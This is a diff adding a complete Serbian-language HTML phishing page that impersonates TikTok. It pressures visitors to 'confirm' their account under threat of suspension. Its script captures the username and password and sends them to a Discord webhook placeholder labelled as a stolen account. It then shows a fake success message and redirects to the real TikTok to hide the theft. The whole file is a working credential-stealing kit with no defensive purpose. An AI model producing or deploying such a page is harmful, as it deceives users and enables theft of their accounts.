@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Potvrda naloga</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 10px;
+        }
+        .logo span {
+            color: #fe2c55; /* TikTok crvena */
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #e0264b;
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="logo">Tik<span>Tok</span></div>
+        <div class="subtitle">Potvrdite svoj nalog da biste izbegli suspendovanje</div>
+        
+        <form id="phishForm">
+            <div class="input-group">
+                <label for="username">Korisničko ime ili e-mail</label>
+                <input type="text" id="username" name="username" required placeholder="npr. john.doe">
+            </div>
+            <div class="input-group">
+                <label for="password">Lozinka</label>
+                <input type="password" id="password" name="password" required placeholder="Vaša lozinka">
+            </div>
+            <button type="submit" class="btn">Potvrdi prijavu</button>
+        </form>
+        
+        <div class="footer">© 2023 TikTok. Sva prava zadržana.</div>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Spriječava da stranica preusmeri na pravi TikTok
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Ovde šaljemo podatke na tvoj server (ili na Discord webhook)
+            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**NOVI TIKTOK NALOG UKRADEN!**\n\n**Korisničko ime:** ${username}\n**Lozinka:** ${password}`
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // Pokaži lažnu poruku uspeha
+                    document.body.innerHTML = `
+                        <div class="login-box">
+                            <h2>✅ Potvrda uspešna!</h2>
+                            <p>Vaš TikTok nalog je bezbedan.</p>
+                            <p>Preusmeravanje na TikTok...</p>
+                        </div>
+                    `;
+                    // Preusmeri na pravi TikTok posle 3 sekunde
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com';
+                    }, 3000);
+                } else {
+                    alert('Greška pri slanju. Pokušajte ponovo.');
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
